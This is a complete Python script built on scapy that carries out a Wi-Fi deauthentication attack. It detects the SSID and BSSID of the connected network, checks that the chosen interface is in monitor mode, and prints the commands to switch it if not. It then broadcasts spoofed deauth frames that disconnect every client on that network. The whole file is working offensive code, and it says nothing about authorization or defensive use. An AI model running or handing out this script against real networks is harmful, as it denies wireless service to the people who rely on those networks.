import os
import time
import subprocess
from scapy.all import *

# Automatically detect the current network SSID and BSSID
def get_current_network():
    try:
        # Get the current SSID using `iwgetid`
        ssid = subprocess.check_output(['iwgetid', '-r']).decode('utf-8').strip()
        # Get the current BSSID
        bssid = subprocess.check_output(['iwgetid', '--raw', '--bssid']).decode('utf-8').strip()
        
        if not ssid or not bssid:
            raise Exception("Could not retrieve SSID or BSSID. Are you connected to Wi-Fi?")
        
        print(f"Detected network: SSID={ssid}, BSSID={bssid}")
        return ssid, bssid
    except Exception as e:
        print(f"Error detecting network: {e}")
        exit(1)

# Deauth function to disconnect all devices on the target network
def deauth_attack(target_bssid, iface):
    print(f"Starting deauthentication attack on BSSID: {target_bssid} via interface: {iface}")
    
    # Construct deauthentication packet
    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
    
    try:
        # Send packets in a loop to simulate the attack
        sendp(packet, iface=iface, count=100, inter=0.1, verbose=True)
        print("Deauthentication packets sent.")
    except Exception as e:
        print(f"Error during deauthentication attack: {e}")
        exit(1)

# Main function
def main():
    # Ensure the script is run with root privileges
    if os.geteuid() != 0:
        print("This script must be run as root. Try using 'sudo'.")
        exit(1)
    
    # Detect the current network SSID and BSSID
    ssid, bssid = get_current_network()

    # Get the interface name
    iface = input("Enter your Wi-Fi interface (e.g., wlan0, wlp2s0): ").strip()
    
    # Check if the interface is in monitor mode
    try:
        monitor_check = subprocess.check_output(['iwconfig', iface]).decode('utf-8')
        if "Mode:Monitor" not in monitor_check:
            print(f"Error: Interface {iface} is not in monitor mode.")
            print("Put the interface in monitor mode with the following commands:")
            print(f"sudo ip link set {iface} down")
            print(f"sudo iw {iface} set type monitor")
            print(f"sudo ip link set {iface} up")
            exit(1)
    except Exception as e:
        print(f"Error checking interface mode: {e}")
        exit(1)

    # Perform the deauth attack
    deauth_attack(bssid, iface)

if __name__ == "__main__":
    main()
